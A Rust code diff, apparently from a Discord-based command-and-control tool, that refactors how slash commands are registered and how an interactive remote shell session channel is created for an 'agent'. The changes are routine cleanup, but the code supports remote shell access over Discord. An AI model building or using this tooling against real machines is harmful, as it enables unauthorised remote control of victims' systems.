@@ -163,7 +163,7 @@ pub async fn run(
         }
     }
 
-    let now = Utc::now().format("%m-%d-%Y┇%H︰%M︰%S╏UTC").to_string(); //TODO: Cleanup this date format
+    let now = Utc::now().format("%m-%d-%Y-%H︰%M︰%S-utc").to_string(); //TODO: Cleanup this date format
 
     // Grab the session type from options
     let option = options
@@ -176,31 +176,35 @@ pub async fn run(
     let ctx1 = ctx.to_owned();
     let ctx2 = ctx.to_owned();
 
-    tokio::try_join!(
-        tokio::spawn(async {
-            match Command::create_global_application_command(ctx1, exit::register).await {
-                Ok(_) => {
-                    informational!("Successfully registered exit command.");
-                },
-                Err(why) => {
-                    error!("Failed to register the exit command: {:?}", why);
-                }
+    tokio::spawn(async {
+            if let Err(why) = Command::create_global_application_command(ctx1, exit::register).await
+            {
+                error!("Failed to register the exit command: {:?}", why);
+                return;
             }
-        }),
-        tokio::spawn(async {
-            match Command::create_global_application_command(ctx2, download::register).await {
-                Ok(_) => {
-                    informational!("Successfully registered download command.");
-                },
-                Err(why) => {
-                    error!("Failed to register the download command: {:?}", why);
-                }
+
+            informational!("Successfully registered exit command.");
+        });
+
+    tokio::spawn(async {
+            if let Err(why) =
+                Command::create_global_application_command(ctx2, download::register).await
+            {
+                error!("Failed to register the download command: {:?}", why);
+                return;
             }
-        }),
-    )?;
+
+            informational!("Successfully registered download command.");
+        });
 
     // Create a channel for the remote session, and set the name/topic appropriately
-    let session_channel = create_text_channel(ctx, &now, agent.get_category_channel(), "This is a unique and interactive command session created with your agent. Normal commands will not work here.").await?;
+    let session_channel = create_text_channel(
+        ctx,
+        &now,
+        agent.get_category_channel(),
+        "This is a unique and interactive command session created with your agent. Normal commands will not work here."
+    ).await?;
+
     tokio::spawn(async move {
         if let Err(why) = agent.set_session_channel(Some(session_channel)) {
             error!("{}", why);
@@ -234,7 +238,9 @@ pub async fn run(
                 ProcessHandler::instance(&ShellType::Zsh).await?;
                 (string.as_str(), ShellType::Zsh)
             }
-            _ => return Err(DiscordC2Error::InvalidShellType),
+            _ => {
+                return Err(DiscordC2Error::InvalidShellType);
+            }
         };
         Ok((content.to_string(), Option::from(shell))) //Return the success message and the shell type wrapped with an Option
     } else {
